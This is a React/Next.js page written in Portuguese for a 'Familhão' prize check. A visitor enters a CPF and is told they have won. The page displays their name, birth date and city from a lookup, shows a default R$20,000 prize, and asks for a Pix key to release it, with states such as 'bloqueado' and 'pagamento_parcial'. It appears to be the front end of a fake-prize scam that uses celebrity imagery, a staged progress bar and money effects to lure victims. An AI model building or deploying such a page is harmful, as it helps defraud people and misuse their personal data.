"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import Image from "next/image";
import { consultarCpf, enviarPixChave, type DadosGanhador } from "./actions";
type Estagio = "form" | "carregando" | "resultado" | "erro";

function maskCpf(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 11);
  if (d.length <= 3) return d;
  if (d.length <= 6) return `${d.slice(0, 3)}.${d.slice(3)}`;
  if (d.length <= 9) return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6)}`;
  return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`;
}

function FamilhaoLogo() {
  return (
    <Image
      src="/familhao/logo.webp"
      alt="Familhão"
      width={170}
      height={39}
      priority
      className="h-8 w-auto sm:h-10"
    />
  );
}

export default function GanhadorPage() {
  const [estagio, setEstagio] = useState<Estagio>("form");
  const [cpf, setCpf] = useState("");
  const [erro, setErro] = useState("");
  const [dados, setDados] = useState<DadosGanhador | null>(null);
  const [progresso, setProgresso] = useState(0);

  async function consultar(e: React.FormEvent) {
    e.preventDefault();
    const raw = cpf.replace(/\D/g, "");
    if (raw.length !== 11) { setErro("Digite um CPF válido com 11 dígitos."); return; }

    setErro("");
    setEstagio("carregando");
    setProgresso(0);

    const intervalo = setInterval(() => {
      setProgresso((p) => Math.min(p + Math.random() * 15, 90));
    }, 200);

    const resultado = await consultarCpf(raw);

    clearInterval(intervalo);
    setProgresso(100);

    await new Promise((r) => setTimeout(r, 400));

    if (!resultado.ok) {
      setErro(resultado.erro);
      setEstagio("erro");
      return;
    }

    setDados(resultado.dados);
    setEstagio("resultado");
  }

  function voltar() {
    setEstagio("form");
    setCpf("");
    setErro("");
    setDados(null);
    setProgresso(0);
  }

  return (
    <div className="theme-familhao flex min-h-[100dvh] flex-col overflow-hidden">
      <header className="flex justify-center px-4 pt-6 pb-2">
        <FamilhaoLogo />
      </header>

      <main className="flex flex-1 flex-col items-center px-4 pb-12">
        {estagio !== "resultado" && (
          <div className="mt-2 flex justify-center sm:mt-4">
            <div className="w-[240px] sm:w-[280px] md:w-[320px]">
              <Image
                src="/familhao/ivete.webp"
                alt=""
                width={320}
                height={400}
                className="h-auto w-full object-contain"
                priority
                style={{ maskImage: "radial-gradient(ellipse 75% 75% at 50% 45%, black 50%, transparent 100%)" }}
              />
            </div>
          </div>
        )}

        <div className={`w-full max-w-md ${estagio === "resultado" ? "mt-4" : "mt-6 sm:mt-8"}`}>
          {estagio === "form" && (
            <FormCpf cpf={cpf} setCpf={setCpf} erro={erro} onSubmit={consultar} />
          )}
          {estagio === "carregando" && <BarraProgresso progresso={progresso} />}
          {estagio === "erro" && <TelaErro erro={erro} onVoltar={voltar} />}
          {estagio === "resultado" && dados && (
            <Celebracao dados={dados} onVoltar={voltar} />
          )}
        </div>
      </main>
    </div>
  );
}

function FormCpf({
  cpf, setCpf, erro, onSubmit,
}: {
  cpf: string;
  setCpf: (v: string) => void;
  erro: string;
  onSubmit: (e: React.FormEvent) => void;
}) {
  return (
    <form onSubmit={onSubmit} className="flex w-full max-w-sm animate-fade-up flex-col items-center gap-6">
      <div className="text-center">
        <h1 className="text-2xl font-black tracking-tight text-white">Consultar Prêmio</h1>
        <p className="mt-2 text-sm text-white/70">Digite seu CPF para verificar se você foi contemplado.</p>
      </div>
      <div className="w-full">
        <input
          type="text"
          inputMode="numeric"
          placeholder="000.000.000-00"
          value={cpf}
          onChange={(e) => setCpf(maskCpf(e.target.value))}
          className="h-14 w-full rounded-2xl border border-white/20 bg-white/10 px-5 text-center text-lg tracking-wider text-white shadow-[inset_0_2px_4px_0_rgb(0_0_0/0.2)] placeholder:text-white/40 outline-none backdrop-blur-sm transition-all duration-300 focus:border-[#D04AFF]/60 focus:bg-white/15 focus:shadow-[0_0_0_4px_rgb(208_74_255/0.2)]"
          autoFocus
        />
        {erro && <p className="mt-2 text-center text-sm text-[#FF97E2]">{erro}</p>}
      </div>
      <button
        type="submit"
        className="h-12 w-full rounded-full bg-gradient-to-r from-[#FF97E2] to-[#FF2FC4] text-base font-black text-white shadow-[0_4px_20px_-4px_rgb(255_47_196/0.5)] transition-all duration-300 hover:shadow-[0_6px_28px_-4px_rgb(255_47_196/0.7)] active:scale-[0.97]"
      >
        CONSULTAR
      </button>
    </form>
  );
}

function BarraProgresso({ progresso }: { progresso: number }) {
  return (
    <div className="flex w-full max-w-sm animate-fade-in flex-col items-center gap-6">
      <div className="flex flex-col items-center gap-3">
        <div className="size-10 animate-spin rounded-full border-2 border-[#D04AFF]/30 border-t-[#D04AFF]" />
        <p className="text-sm text-white/70">Verificando seu CPF...</p>
      </div>
      <div className="h-2 w-full overflow-hidden rounded-full bg-white/10">
        <div
          className="h-full rounded-full bg-gradient-to-r from-[#8128E8] to-[#D04AFF] transition-all duration-500 ease-out"
          style={{ width: `${progresso}%` }}
        />
      </div>
    </div>
  );
}

function TelaErro({ erro, onVoltar }: { erro: string; onVoltar: () => void }) {
  return (
    <div className="flex w-full max-w-sm animate-fade-up flex-col items-center gap-6 text-center">
      <div className="flex size-16 items-center justify-center rounded-full bg-[#FF52CF]/15 text-3xl">
        😔
      </div>
      <div>
        <h2 className="text-xl font-black text-white">Não encontrado</h2>
        <p className="mt-2 text-sm text-white/70">{erro}</p>
      </div>
      <button
        type="button"
        onClick={onVoltar}
        className="h-11 w-full rounded-full border border-white/20 bg-white/10 text-sm font-bold text-white backdrop-blur-sm transition-all duration-300 hover:bg-white/15 active:scale-[0.97]"
      >
        Tentar outro CPF
      </button>
    </div>
  );
}

function chuvaDeDinheiro() {
  const canvas = document.createElement("canvas");
  canvas.style.cssText = "position:fixed;inset:0;z-index:9999;pointer-events:none;";
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  document.body.appendChild(canvas);
  const ctx = canvas.getContext("2d")!;

  const img = new window.Image();
  img.src = "/familhao/nota100.jpg";
  const notas: { x: number; y: number; vx: number; vy: number; rot: number; vr: number; s: number; opacity: number; flip: number; vf: number }[] = [];
  for (let i = 0; i < 40; i++) {
    notas.push({
      x: Math.random() * canvas.width,
      y: -Math.random() * canvas.height * 1.5,
      vx: (Math.random() - 0.5) * 2,
      vy: 2 + Math.random() * 3,
      rot: Math.random() * Math.PI * 2,
      vr: (Math.random() - 0.5) * 0.08,
      s: 0.5 + Math.random() * 0.5,
      opacity: 1,
      flip: Math.random() * Math.PI,
      vf: 0.03 + Math.random() * 0.05,
    });
  }

  function drawNota(n: (typeof notas)[0]) {
    ctx.save();
    ctx.translate(n.x, n.y);
    ctx.rotate(n.rot);
    ctx.scale(n.s, n.s);
    ctx.globalAlpha = n.opacity;

    ctx.scale(1, Math.cos(n.flip));
    const w = 110, h = 49;
    if (img.complete) ctx.drawImage(img, -w / 2, -h / 2, w, h);

    ctx.restore();
  }

  const inicio = Date.now();
  const duracao = 6000;
  function frame() {
    const t = Date.now() - inicio;
    if (t > duracao) { canvas.remove(); return; }
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    const fade = t > duracao - 1000 ? (duracao - t) / 1000 : 1;
    for (const n of notas) {
      n.x += n.vx;
      n.y += n.vy;
      n.rot += n.vr;
      n.flip += n.vf;
      n.vx += (Math.random() - 0.5) * 0.3;
      n.opacity = fade;
      if (n.y > canvas.height + 50) { n.y = -40; n.x = Math.random() * canvas.width; }
      drawNota(n);
    }
    requestAnimationFrame(frame);
  }
  requestAnimationFrame(frame);
}

function tocarSomDinheiro() {
  try {
    const ac = new AudioContext();

    // som de moedas/caixa eletrônico
    function coin(delay: number) {
      const osc = ac.createOscillator();
      const gain = ac.createGain();
      osc.connect(gain);
      gain.connect(ac.destination);
      osc.type = "sine";
      osc.frequency.setValueAtTime(2400, ac.currentTime + delay);
      osc.frequency.exponentialRampToValueAtTime(800, ac.currentTime + delay + 0.15);
      gain.gain.setValueAtTime(0.15, ac.currentTime + delay);
      gain.gain.exponentialRampToValueAtTime(0.001, ac.currentTime + delay + 0.3);
      osc.start(ac.currentTime + delay);
      osc.stop(ac.currentTime + delay + 0.3);
    }

    // sequência rápida tipo caixa eletrônico contando dinheiro
    for (let i = 0; i < 8; i++) coin(i * 0.12);

    // "cha-ching" final
    setTimeout(() => {
      const osc1 = ac.createOscillator();
      const osc2 = ac.createOscillator();
      const g1 = ac.createGain();
      const g2 = ac.createGain();
      osc1.connect(g1); g1.connect(ac.destination);
      osc2.connect(g2); g2.connect(ac.destination);
      osc1.type = "sine"; osc2.type = "triangle";
      osc1.frequency.value = 1568; osc2.frequency.value = 2093;
      g1.gain.setValueAtTime(0.2, ac.currentTime);
      g2.gain.setValueAtTime(0.12, ac.currentTime);
      g1.gain.exponentialRampToValueAtTime(0.001, ac.currentTime + 0.8);
      g2.gain.exponentialRampToValueAtTime(0.001, ac.currentTime + 0.8);
      osc1.start(); osc2.start();
      osc1.stop(ac.currentTime + 0.8); osc2.stop(ac.currentTime + 0.8);
    }, 1200);
  } catch { /* audio blocked */ }
}

function Celebracao({ dados, onVoltar }: { dados: DadosGanhador; onVoltar: () => void }) {
  const [etapa, setEtapa] = useState(0);
  const confettiDisparado = useRef(false);
  const [contadorValor, setContadorValor] = useState(0);
  const [pixModal, setPixModal] = useState(false);
  const [copiado, setCopiado] = useState(false);

  const [dadosAtuais, setDadosAtuais] = useState(dados);
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    pollingRef.current = setInterval(async () => {
      const res = await consultarCpf(dadosAtuais.cpf.replace(/\D/g, ""));
      if (res.ok) setDadosAtuais((prev) => ({ ...prev, premio: res.dados.premio }));
    }, 3000);
    return () => { if (pollingRef.current) clearInterval(pollingRef.current); };
  }, [dadosAtuais.cpf]);

  const valorPremio = dadosAtuais.premio?.valor || 20000;

  const dispararEfeitos = useCallback(() => {
    if (confettiDisparado.current) return;
    confettiDisparado.current = true;
    chuvaDeDinheiro();
    tocarSomDinheiro();
  }, []);

  useEffect(() => {
    const timers = [
      setTimeout(() => { setEtapa(1); dispararEfeitos(); }, 200),
      setTimeout(() => setEtapa(2), 1400),
      setTimeout(() => setEtapa(3), 2200),
      setTimeout(() => setEtapa(4), 3000),
      setTimeout(() => setEtapa(5), 3800),
    ];
    return () => timers.forEach(clearTimeout);
  }, [dispararEfeitos]);

  useEffect(() => {
    if (etapa < 2) return;
    let frame: number;
    const inicio = performance.now();
    const duracao = 2000;
    function animar(agora: number) {
      const t = Math.min((agora - inicio) / duracao, 1);
      const ease = 1 - Math.pow(1 - t, 4);
      setContadorValor(Math.round(ease * valorPremio * 100) / 100);
      if (t < 1) frame = requestAnimationFrame(animar);
    }
    frame = requestAnimationFrame(animar);
    return () => cancelAnimationFrame(frame);
  }, [etapa, valorPremio]);

  function formatarValor(v: number) {
    return v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
  }

  function formatCpfExibir(cpf: string) {
    const d = cpf.replace(/\D/g, "");
    return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`;
  }

  async function copiarCodigo() {
    const codigo = dadosAtuais.premio?.codigo;
    if (!codigo) return;
    try {
      await navigator.clipboard.writeText(codigo);
      setCopiado(true);
      setTimeout(() => setCopiado(false), 2000);
    } catch { /* clipboard blocked */ }
  }

  const premio = dadosAtuais.premio;
  const temCodigo = premio?.codigo;
  const liberado = premio?.estado === "liberado" || premio?.estado === "pagamento_parcial";
  const temPix = premio?.pix_chave;

  return (
    <div className="flex w-full max-w-md flex-col items-center gap-5 pb-8">
      {/* Glow background pulse */}
      <div className="pointer-events-none absolute inset-0 overflow-hidden">
        <div className="celebracao-glow absolute left-1/2 top-1/3 size-[500px] -translate-x-1/2 -translate-y-1/2 rounded-full bg-[#FFD700]/8 blur-[100px]" />
      </div>

      {etapa >= 1 && (
        <div className="relative z-10 text-center" style={{ animation: "celebracao-entrada 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) both" }}>
          <div className="flex items-center justify-center gap-2">
            <span className="celebracao-estrela text-base" style={{ animationDelay: "0.3s" }}>✦</span>
            <h1 className="parabens-glow bg-gradient-to-r from-[#FFE066] via-[#FFD700] to-[#FFA500] bg-clip-text text-5xl font-black uppercase italic tracking-tight text-transparent pr-3 sm:text-6xl">
              Parabéns!
            </h1>
            <span className="celebracao-estrela text-base" style={{ animationDelay: "0.5s" }}>✦</span>
          </div>
          <p className="mt-2 text-base font-bold text-[#FFE066]/90">
            Você foi contemplado no Familhão!
          </p>
        </div>
      )}

      {etapa >= 2 && (
        <div className="relative z-10 w-full" style={{ animation: "celebracao-card 0.6s cubic-bezier(0.22, 1, 0.36, 1) both" }}>
          <div className="rounded-3xl border-2 border-[#FFD700]/50 bg-gradient-to-br from-[#1A0037]/90 to-[#2D0A57]/70 px-4 py-6 text-center shadow-[0_0_50px_-8px_rgb(255_215_0/0.35)] backdrop-blur-sm">
            <p className="mb-1 text-sm font-black uppercase tracking-[0.14em] text-[#FFD700]">
              Seu prêmio
            </p>
            <p className="parabens-glow bg-gradient-to-r from-[#FFE066] via-[#FFD700] to-[#FFA500] bg-clip-text text-5xl font-black tabular-nums tracking-tight text-transparent sm:text-6xl">
              {formatarValor(contadorValor)}
            </p>
          </div>
        </div>
      )}

      {etapa >= 2 && (
        <div className="relative z-10 w-full" style={{ animation: "celebracao-card 0.6s cubic-bezier(0.22, 1, 0.36, 1) both" }}>
          <div className="rounded-3xl border border-[#FFD700]/20 bg-gradient-to-br from-[#2D0A57]/90 to-[#1A0037]/90 p-5 shadow-[0_8px_32px_-8px_rgb(255_215_0/0.15)] backdrop-blur-sm">
            <p className="mb-3 text-xs font-black uppercase tracking-[0.14em] text-[#FFD700]">
              ✦ Ganhador Confirmado
            </p>
            <div className="space-y-2.5 text-sm">
              <InfoRow label="Nome" value={dadosAtuais.nome} />
              <InfoRow label="CPF" value={formatCpfExibir(dadosAtuais.cpf)} />
              {dadosAtuais.nascimento && <InfoRow label="Nascimento" value={formatDataBr(dadosAtuais.nascimento)} />}
              {dadosAtuais.cidade && <InfoRow label="Cidade" value={dadosAtuais.cidade} />}
            </div>
          </div>
        </div>
      )}

      {etapa >= 3 && temCodigo && (
        <div className="relative z-10 w-full" style={{ animation: "celebracao-card 0.6s cubic-bezier(0.22, 1, 0.36, 1) both" }}>
          <div className="rounded-3xl border border-[#FFD700]/15 bg-[#1A0037]/80 p-5 text-center backdrop-blur-sm">
            <p className="mb-3 text-xs font-black uppercase tracking-[0.14em] text-[#DFC0FF]">
              Bilhete Premiado
            </p>
            <p className="font-mono text-2xl font-bold tracking-[0.2em] text-white">{temCodigo}</p>
          </div>
        </div>
      )}


      {etapa >= 5 && (
        <div className="relative z-10 w-full" style={{ animation: "celebracao-card 0.6s cubic-bezier(0.22, 1, 0.36, 1) both" }}>
          {liberado && temCodigo ? (
            <div className="rounded-3xl border border-[#4ade80]/30 bg-gradient-to-br from-[#4ade80]/15 to-[#2D0A57]/80 p-5 text-center backdrop-blur-sm">
              <p className="mb-3 text-xs font-black uppercase tracking-[0.14em] text-[#4ade80]">
                ✦ Prêmio Liberado!
              </p>
              <p className="mb-4 text-sm text-white/70">Copie o código para resgatar seu prêmio.</p>
              <div className="rounded-2xl bg-[#1A0037]/80 p-4">
                <p className="font-mono text-lg font-bold tracking-[0.15em] text-white">{temCodigo}</p>
              </div>
              <button
                type="button"
                onClick={copiarCodigo}
                className="mt-4 h-12 w-full rounded-full bg-gradient-to-r from-[#4ade80] to-[#22c55e] text-sm font-black text-[#052e16] shadow-[0_4px_20px_-4px_rgb(74_222_128/0.5)] transition-all duration-300 hover:shadow-[0_6px_28px_-4px_rgb(74_222_128/0.7)] active:scale-[0.97]"
              >
                {copiado ? "COPIADO!" : "COPIAR CÓDIGO"}
              </button>
            </div>
          ) : temPix ? (
            <div className="rounded-3xl border border-[#FFD700]/25 bg-gradient-to-br from-[#FFD700]/10 to-[#1A0037]/80 p-6 text-center backdrop-blur-sm">
              <div className="mb-3 flex justify-center">
                <div className="flex size-10 items-center justify-center rounded-full bg-[#FFD700]/20">
                  <span className="celebracao-estrela text-lg text-[#FFD700]">⏳</span>
                </div>
              </div>
              <p className="text-lg font-black text-[#FFD700]">Aguardando liberação</p>
              <p className="mt-2 text-sm text-white/60">
                Sua chave Pix foi registrada. O código do prêmio será liberado em breve.
              </p>
            </div>
          ) : (
            <div className="rounded-3xl border border-[#D04AFF]/30 bg-gradient-to-br from-[#2D0A57]/90 to-[#1A0037]/90 p-5 text-center backdrop-blur-sm">
              <p className="mb-4 text-sm text-white/70">
                Para resgatar seu prêmio, informe sua chave Pix.
              </p>
              <button
                type="button"
                onClick={() => setPixModal(true)}
                className="h-12 w-full rounded-full bg-gradient-to-r from-[#FF97E2] to-[#FF2FC4] text-sm font-black text-white shadow-[0_4px_24px_-4px_rgb(255_47_196/0.5)] transition-all duration-300 hover:shadow-[0_6px_32px_-4px_rgb(255_47_196/0.7)] active:scale-[0.97]"
              >
                RESGATAR MEU PRÊMIO
              </button>
            </div>
          )}
        </div>
      )}

      {etapa >= 5 && (
        <button
          type="button"
          onClick={onVoltar}
          className="relative z-10 mt-2 text-sm text-white/40 transition-colors hover:text-white/70"
        >
          Consultar outro CPF
        </button>
      )}

      {pixModal && (
        <ModalPix
          cpf={dadosAtuais.cpf}
          onClose={() => setPixModal(false)}
          onSalvo={(tipo, chave) => {
            setDadosAtuais((prev) => ({
              ...prev,
              premio: {
                codigo: prev.premio?.codigo ?? null,
                estado: prev.premio?.estado ?? "bloqueado",
                valor: prev.premio?.valor ?? null,
                pix_tipo: tipo,
                pix_chave: chave,
              },
            }));
            setPixModal(false);
          }}
        />
      )}

      <style>{`
        @keyframes celebracao-entrada {
          0% { opacity: 0; transform: scale(0.5) translateY(30px); }
          100% { opacity: 1; transform: scale(1) translateY(0); }
        }
        @keyframes emoji-pop {
          0% { opacity: 0; transform: scale(0) rotate(-20deg); }
          50% { transform: scale(1.4) rotate(5deg); }
          70% { transform: scale(0.9) rotate(-3deg); }
          100% { opacity: 1; transform: scale(1) rotate(0deg); }
        }
        .parabens-glow {
          filter: drop-shadow(0 0 20px rgb(255 215 0 / 0.5)) drop-shadow(0 0 60px rgb(255 165 0 / 0.3));
        }
        @keyframes celebracao-card {
          0% { opacity: 0; transform: translateY(20px) scale(0.95); }
          100% { opacity: 1; transform: translateY(0) scale(1); }
        }
        .celebracao-estrela {
          animation: estrela-pulse 1.5s ease-in-out infinite;
          color: #FFD700;
        }
        @keyframes estrela-pulse {
          0%, 100% { opacity: 0.4; transform: scale(0.8); }
          50% { opacity: 1; transform: scale(1.2); }
        }
        .celebracao-glow {
          animation: glow-pulse 3s ease-in-out infinite;
        }
        @keyframes glow-pulse {
          0%, 100% { opacity: 0.3; transform: translate(-50%, -50%) scale(1); }
          50% { opacity: 0.6; transform: translate(-50%, -50%) scale(1.2); }
        }
      `}</style>
    </div>
  );
}

function InfoRow({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex justify-between gap-3">
      <span className="text-[#DFC0FF]">{label}</span>
      <span className="text-right font-bold text-white">{value}</span>
    </div>
  );
}

function formatDataBr(iso: string) {
  const [y, m, d] = iso.split("-");
  return `${d}/${m}/${y}`;
}

function ModalPix({
  cpf, onClose, onSalvo,
}: {
  cpf: string;
  onClose: () => void;
  onSalvo: (tipo: string, chave: string) => void;
}) {
  const [tipo, setTipo] = useState("cpf");
  const [chave, setChave] = useState(maskCpf(cpf));
  const [salvando, setSalvando] = useState(false);
  const [erro, setErro] = useState("");

  function maskChave(v: string, t: string) {
    if (t === "cpf") return maskCpf(v);
    if (t === "telefone") {
      const d = v.replace(/\D/g, "").slice(0, 11);
      if (d.length <= 2) return d;
      if (d.length <= 7) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
      return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
    }
    return v;
  }

  async function salvar(e: React.FormEvent) {
    e.preventDefault();
    if (!chave.trim()) { setErro("Preencha a chave Pix."); return; }
    setSalvando(true);
    setErro("");
    const res = await enviarPixChave(cpf, tipo, chave);
    setSalvando(false);
    if (!res.ok) { setErro(res.erro ?? "Erro ao salvar."); return; }
    onSalvo(tipo, chave);
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#1A0037]/80 px-4 backdrop-blur-sm">
      <div className="w-full max-w-sm animate-fade-up rounded-3xl border border-white/15 bg-[#2D0A57] p-6 shadow-[0_24px_48px_-24px_rgb(0_0_0/0.6)]">
        <h3 className="mb-4 text-lg font-black text-white">Chave Pix</h3>
        <form onSubmit={salvar} className="flex flex-col gap-4">
          <div>
            <label className="mb-1.5 block text-xs font-bold text-[#DFC0FF]">Tipo da chave</label>
            <select
              value={tipo}
              onChange={(e) => { const t = e.target.value; setTipo(t); setChave(t === "cpf" ? maskCpf(cpf) : ""); }}
              className="h-11 w-full appearance-none rounded-2xl border border-white/15 bg-white/10 px-3.5 text-sm text-white outline-none transition-all duration-300 focus:border-[#D04AFF]/60 [&_option]:bg-[#2D0A57] [&_option]:text-white"
            >
              <option value="cpf">CPF</option>
              <option value="telefone">Telefone</option>
              <option value="email">E-mail</option>
              <option value="aleatoria">Chave aleatória</option>
            </select>
          </div>
          <div>
            <label className="mb-1.5 block text-xs font-bold text-[#DFC0FF]">Chave</label>
            <input
              type="text"
              value={chave}
              onChange={(e) => setChave(maskChave(e.target.value, tipo))}
              placeholder={
                tipo === "cpf" ? "000.000.000-00"
                : tipo === "telefone" ? "(00) 00000-0000"
                : tipo === "email" ? "email@exemplo.com"
                : "Cole sua chave aqui"
              }
              className="h-11 w-full rounded-2xl border border-white/15 bg-white/10 px-3.5 text-sm text-white placeholder:text-white/40 outline-none transition-all duration-300 focus:border-[#D04AFF]/60"
              autoFocus
            />
          </div>
          {erro && <p className="text-sm text-[#FF97E2]">{erro}</p>}
          <div className="flex gap-3">
            <button
              type="button"
              onClick={onClose}
              className="h-11 flex-1 rounded-full border border-white/20 bg-white/10 text-sm font-bold text-white transition-all duration-300 hover:bg-white/15 active:scale-[0.97]"
            >
              Cancelar
            </button>
            <button
              type="submit"
              disabled={salvando}
              className="h-11 flex-1 rounded-full bg-gradient-to-r from-[#FF97E2] to-[#FF2FC4] text-sm font-black text-white transition-all duration-300 hover:shadow-[0_4px_20px_-4px_rgb(255_47_196/0.5)] active:scale-[0.97] disabled:opacity-50"
            >
              {salvando ? "Salvando..." : "ENVIAR"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
